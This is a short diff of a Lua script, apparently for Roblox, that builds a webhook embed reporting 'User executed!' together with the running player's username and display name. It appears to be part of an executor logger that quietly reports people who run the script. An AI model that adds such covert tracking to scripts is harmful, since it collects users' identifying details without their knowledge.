@@ -42,8 +42,8 @@ pcall(
         local data = {
             ["embeds"] = {
                 {
-                    ["title"] = "User executed!",
-                    ["description"] = "Username executed! here are the logs;",
+                    ["title"] = "------------------------------------------",
+                    ["description"] = "User executed! here are the logs;",
                     ["fields"] = {
                         {name = "Username", value = game:GetService("Players").LocalPlayer.Name},
                         {name = "DisplayName", value = game:GetService("Players").LocalPlayer.DisplayName},
